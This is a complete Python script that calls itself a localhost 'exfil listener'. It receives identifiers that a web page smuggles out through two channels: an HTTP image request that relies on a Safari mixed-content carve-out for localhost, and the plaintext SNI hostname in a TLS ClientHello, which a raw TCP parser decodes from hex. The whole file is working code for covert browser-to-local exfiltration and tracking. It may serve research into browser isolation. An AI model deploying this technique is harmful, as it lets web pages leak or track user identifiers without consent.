#!/usr/bin/env python3
"""
Two-channel localhost exfil listener. No certificate required.

Channel 1 — IMG (Safari only)
  Browser loads: <img src="http://127.0.0.1:8765/track?id=<identifier>">
  Safari allows HTTP images from localhost even from an HTTPS public origin
  (passive mixed-content carve-out). The identifier travels in the query string.

Channel 2 — SNI (Safari + Chrome)
  Browser fetches: https://id-<hex>.sni.localtest.me:9443/
  The TLS ClientHello contains the hostname in plaintext before any cert check.
  This raw TCP listener extracts it without completing the handshake.

Usage:
  python3 server.py
"""

import argparse, socket, sys, threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs


def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


# ── Tiny 1×1 transparent PNG ─────────────────────────────────────────────────
PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d494844520000000100000001080600000"
    "01f15c489000000017352474200aece1ce90000000d494441540"
    "78963600000000200017af4ed1d0000000049454e44ae426082"
)

CORS = {"Access-Control-Allow-Origin": "*", "Cache-Control": "no-store"}


def http_response(status, headers, body=b""):
    h = "\r\n".join(f"{k}: {v}" for k, v in {**headers,
        "Content-Length": len(body), "Connection": "close"}.items())
    return f"HTTP/1.1 {status}\r\n{h}\r\n\r\n".encode() + body


# ── Channel 1: HTTP IMG listener ──────────────────────────────────────────────
def handle_http(conn, addr):
    try:
        conn.settimeout(5.0)
        raw = conn.recv(4096)
        if not raw:
            return
        line = raw.split(b"\r\n")[0].decode("latin-1", errors="replace")
        parts = line.split()
        if len(parts) < 2:
            return
        path = parts[1]
        parsed = urlparse(path)
        qs = parse_qs(parsed.query)
        identifier = qs.get("id", [None])[0]

        if identifier is not None:
            print(f"\n[{ts()}] IMG  src={addr[0]}:{addr[1]}")
            print(f"  id = {identifier!r}")

        conn.sendall(http_response("200 OK", {**CORS, "Content-Type": "image/png"}, PNG))
    except (socket.timeout, OSError):
        pass
    finally:
        try: conn.close()
        except OSError: pass


def run_http(host, port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(64)
    print(f"[+] IMG  listener  http://{host}:{port}/track?id=...")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_http, args=(conn, addr), daemon=True).start()
        except OSError:
            break


# ── Channel 2: raw TCP SNI listener ──────────────────────────────────────────
def parse_sni(data):
    try:
        if len(data) < 5 or data[0] != 0x16:
            return None
        pos = 9                                   # skip record header + handshake header
        if data[5] != 0x01:
            return None
        pos += 2 + 32                             # version + random
        sid = data[pos]; pos += 1 + sid           # session id
        cs = int.from_bytes(data[pos:pos+2], "big"); pos += 2 + cs
        cm = data[pos]; pos += 1 + cm
        ext_end = pos + 2 + int.from_bytes(data[pos:pos+2], "big"); pos += 2
        while pos + 4 <= ext_end:
            t = int.from_bytes(data[pos:pos+2], "big")
            l = int.from_bytes(data[pos+2:pos+4], "big"); pos += 4
            if t == 0:
                nl = int.from_bytes(data[pos+3:pos+5], "big")
                return data[pos+5:pos+5+nl].decode("ascii", errors="replace")
            pos += l
    except Exception:
        pass
    return None


def decode_sni(sni):
    label = sni.split(".")[0]
    if not label.startswith("id-"):
        return None
    hex_part = label[3:]
    parts = hex_part.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        hex_part = parts[0]
    try:
        return bytes.fromhex(hex_part).decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return None


def handle_sni(conn, addr):
    try:
        conn.settimeout(3.0)
        data = conn.recv(8192)
        if not data:
            return
        sni = parse_sni(data)
        if sni:
            decoded = decode_sni(sni)
            print(f"\n[{ts()}] SNI  src={addr[0]}:{addr[1]}")
            print(f"  hostname = {sni}")
            if decoded is not None:
                print(f"  id       = {decoded!r}")
    except (socket.timeout, OSError):
        pass
    finally:
        try: conn.close()
        except OSError: pass


def run_sni(host, port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(64)
    print(f"[+] SNI  listener  raw TCP {host}:{port}")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_sni, args=(conn, addr), daemon=True).start()
        except OSError:
            break


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    sys.stdout.reconfigure(line_buffering=True)
    p = argparse.ArgumentParser()
    p.add_argument("--http-port", type=int, default=8765)
    p.add_argument("--sni-port",  type=int, default=9443)
    args = p.parse_args()

    threading.Thread(target=run_http, args=("0.0.0.0", args.http_port), daemon=True).start()
    threading.Thread(target=run_sni,  args=("0.0.0.0", args.sni_port),  daemon=True).start()

    print(f"[+] Ctrl-C to stop\n")
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        print("\n[+] done")


if __name__ == "__main__":
    main()
